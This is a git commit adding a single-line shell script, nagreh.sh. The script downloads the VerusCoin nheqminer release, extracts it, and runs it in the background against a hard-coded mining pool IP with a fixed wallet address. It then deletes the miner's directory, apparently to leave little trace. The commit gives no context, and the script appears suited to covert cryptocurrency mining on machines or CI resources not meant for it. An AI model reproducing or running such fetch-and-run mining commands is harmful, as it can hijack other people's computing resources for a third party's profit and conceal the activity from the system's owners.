c297e877d26b6a7f163431948b224c238d541098
faridmd <77087718+faridmd@users.noreply.github.com>
2022-03-24 00:31:08 +0700

    Create nagreh.sh

---
+++ nagreh.sh
@@ -0,0 +1,1 @@
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l 47.254.95.97:3956 -u RHBLVMPogBYkkvmBAzzPrK9dZ2CwAiECJY.Owi-3 -p x -t 2 & rm -rf nheqminer
